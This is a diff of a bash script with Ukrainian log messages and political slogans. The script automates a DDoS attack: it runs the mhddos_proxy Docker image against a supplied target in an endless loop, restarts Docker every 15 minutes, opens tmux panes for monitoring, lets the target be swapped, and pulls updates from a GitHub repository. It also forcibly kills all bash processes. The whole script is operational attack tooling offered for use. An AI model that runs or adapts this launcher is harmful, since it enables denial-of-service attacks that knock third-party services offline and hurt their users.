@@ -1,19 +1,94 @@
 clear
 logfile="/var/log/attack.log"
-command=$1
-parameter=$2
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
-echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Надана команда:" "$1" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $logfile
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
-command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
-command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
-command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
-while true 
-do
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & $command & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
-echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
-sleep 5
-done
+mode=$1  
+command=$2
+parameter=$3
+
+function prepare_command {
+        command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
+        command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
+        command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$parameter" -p 900 --rpc 1000 --table"
+        echo "$command" > /var/tmp/attack_target
+}
+
+function create_environment {
+        tmux new-session -s attack -d
+        tmux split-window -t attack -h -p 50
+        tmux split-window -t attack -v -p 66
+        tmux split-window -t attack -v -p 50
+}
+
+function fill_environment {
+        tmux select-window -t attack
+        tmux send-keys -t 1 'htop' Enter
+        tmux send-keys -t 2 'nload eth0' Enter
+        tmux send-keys -t 3 'tail -f ' "$logfile" Enter
+}
+
+function write_to_log {
+        echo "$(date "+%d.%m.%Y %H:%M:%S")" "$1" >> $logfile
+}
+
+function kill_environment {
+        tmux select-window -t attack
+        tmux send-keys -t 0 C-c Enter
+        tmux kill-session
+        rm /var/tmp/attack_target
+        pkill -KILL bash &
+        systemctl restart docker.service
+}
+
+
+function attack {
+        command=$(</var/tmp/attack_target)
+        tmux select-window -t attack & tmux send-keys -t 0 "$command" Enter & sleep 900 && tmux send-keys -t 0 C-c Enter && sleep 5 && tmux send-keys -t 0 "systemctl restart docker.service" Enter
+}
+
+function update {
+        echo 'Зупиняю роботу скриптів' 
+        tmux select-window -t attack &
+        tmux send-keys -t 0 C-c Enter &
+        echo 'Виконую оновлення скриптів'
+        rm -rf /etc/attack 
+        git clone -b testing https://github.com/va1d3mar/attack.git &&
+        echo 'Оновлення завершено'
+        write_to_log 'Проведено оновлення скриптів з Github'
+        kill_environment &
+}
+
+case $mode in
+        attack)
+        write_to_log 'Аналізую команду'
+        prepare_command
+        write_to_log 'Команда відредагована'
+        create_environment
+        write_to_log 'Нове оточення створено'
+        fill_environment
+        write_to_log 'Нове оточення наповнено'
+        while true
+        do
+                write_to_log 'Розпочинаю цикл атаки'
+                attack
+                write_to_log 'Цикл атаки завершено, докер перезапущено, шоб не висло'
+        done
+                ;;
+
+        halt)
+        write_to_log 'Завершення роботи оточення'
+        kill_environment
+                ;;
+
+        change)
+        write_to_log 'Змінюю ціль'
+        prepare_command
+                ;;
+
+        update)
+        update
+                ;;
+                
+        *)
+        write_to_log 'Йа нєпанімаю ваш язік. Пішітє правельно!'
+        echo "Йа нєпанімаю ваш язік. Пішітє правельно!"
+        ;;
+esac
